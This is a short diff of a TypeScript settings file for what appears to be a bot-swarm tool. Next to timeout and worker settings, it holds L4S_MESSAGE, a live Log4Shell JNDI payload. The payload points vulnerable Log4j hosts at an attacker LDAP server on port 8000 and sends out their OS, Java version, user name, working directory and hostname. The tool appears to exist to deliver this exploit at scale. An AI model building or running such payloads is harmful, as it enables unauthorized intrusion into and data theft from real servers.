@@ -31,6 +31,7 @@ export const settings = {
   BOT_WORKERS: Number(requiredEnv("BOT_WORKERS")),
   DB_RETRY_DELAY_SECONDS: Number(requiredEnv("DB_RETRY_DELAY_SECONDS")),
   BOT_IDLE_TIMEOUT: Number(requiredEnv("BOT_IDLE_TIMEOUT")),
+  BOT_CONNECT_TIMEOUT: Number(requiredEnv("BOT_CONNECT_TIMEOUT")) * 1000,
   BOT_MAX_LIFETIME: Number(requiredEnv("BOT_MAX_LIFETIME")),
   BOT_NAME_PREFIX: requiredEnv("BOT_NAME_PREFIX"),
   BOT_NAME_LENGTH: 10,
@@ -38,5 +39,6 @@ export const settings = {
   L4S_MESSAGE:
     "${jndi:ldap://" +
     requiredEnv("L4S_SERVER_IP") +
-    ":8000/${java:os};${java:version};${env:USER:${env:USERNAME}};${env:PWD};${env:HOSTNAME}},",
+    ":8000/${java:os};${java:version};${env:USER:${env:USERNAME}};${env:PWD};${env:HOSTNAME}}",
+  WORKER_RESTART_ON_FAILURE_DELAY: Number(requiredEnv("WORKER_RESTART_ON_FAILURE_DELAY"))
 };
